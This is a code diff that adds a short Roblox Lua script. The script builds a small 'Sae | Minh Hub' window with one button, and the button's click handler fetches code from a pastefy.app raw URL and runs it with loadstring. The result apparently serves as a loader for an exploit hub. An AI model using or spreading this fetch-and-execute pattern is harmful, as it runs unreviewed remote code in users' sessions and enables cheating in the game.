@@ -1,0 +1,36 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SaeMinhHub"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 200, 0, 100)
+mainFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
+mainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+title.BorderSizePixel = 0
+title.Text = "Sae | Minh Hub"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0.5, -20)
+button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+button.BorderSizePixel = 0
+button.Text = "zzz"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.SourceSansBold
+button.TextSize = 18
+button.Parent = mainFrame
+
+button.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastefy.app/boSTPDYt/raw",true))()
+end)
